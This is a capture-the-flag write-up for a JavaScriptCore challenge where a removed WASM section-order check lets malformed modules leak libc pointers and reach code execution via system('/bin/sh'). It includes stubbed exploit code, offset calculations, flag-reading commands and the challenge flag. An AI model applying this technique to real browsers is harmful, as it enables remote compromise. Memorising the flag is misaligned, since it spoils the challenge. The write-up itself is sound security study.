# JustCause

## Challenge Overview
Name: JustCause
Author: N/A
Category: WebAssembly / JavaScriptCore
Description: WebAssembly parser vulnerability in WebKit's JavaScriptCore caused by removing WASM section order validation.
Flag format: midnight{...}
Objective: Abuse malformed out-of-order WASM sections to leak memory, bypass ASLR, and execute commands to read the flag.

## Files Provided
- p.patch
- JavaScriptCore/WebKit challenge files

## Solution Plan
1. Analyze the patch and identify that `validateOrder(m_previousKnownSection, section)` was removed from `WasmStreamingParser.cpp`.
2. Build malformed WASM modules with out-of-order sections to confuse parser state and leak libc-related pointers through custom sections.
3. Calculate libc base from the leak, prepare a second malformed WASM module to trigger the RCE path, and retry until ASLR/heap layout aligns.
4. Execute a flag-reading command such as `/readflag`, `cat /flag`, or `cat flag`.

## Code (Exploit Script)
```python
class JustCauseExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        # Encode malformed WASM payloads.

    def send_script(self, io):
        # Send: "script size: <size>\nscript: \n<payload>\n"
        pass

    def recv_output(self, io):
        # Receive output from the remote JavaScriptCore service.
        pass

    def check_flag(self, output):
        return b"midnight{" in output

    def exploit(self):
        # Retry loop:
        # 1. leakLibc()
        # 2. calculate system/binsh
        # 3. send RCE WASM
        # 4. run flag-reading command
        pass
```

```javascript
// Leak phase idea:
// globalI32(4) + customSec('x', 192) + globalV128()
// customSections(module, 'x') returns confused memory containing useful pointers.

// RCE phase idea:
// globalI32(8) + memSec() + dataPassive(24, 24)
// + globalV128(system, binsh) + badSec()
// badSec() triggers parser error and affects cleanup/heap state.
```

```javascript
// Address calculation idea:
const jscOff = [0x1d153fb, 0x161f8fb, 0x1fbbfb, 0x16494fb];
libc_base = (leaked_addr - jsc_offset) + 0x1c90000;
system = libc_base + 0x470a4;
binsh = libc_base + 0x152ce0;
```

## Flag
```txt
midnight{Exploiting_JavaScript_engines_can_have_many_Shapes}
```

## Notes
The patch removed WASM section order validation from `WasmStreamingParser.cpp`. Normal WASM section order is enforced for known sections, while custom sections can appear anywhere. Without the validation, malformed sequences such as `Global -> Custom -> Memory` become possible and can confuse parser state.

The exploit used two main phases. The first phase crafted malformed WASM sections to make `customSections(module, 'x')` expose memory containing libc-related pointers. The second phase used the calculated libc base to prepare an RCE-oriented WASM module containing `system` and `/bin/sh` addresses.

Because the exploit depends on heap and JIT layout, it is probabilistic. The final approach repeatedly leaked libc, calculated `system` and `/bin/sh`, sent the RCE WASM, and attempted commands such as `/readflag || cat /flag || cat flag || id` until the layout aligned and the flag was printed.
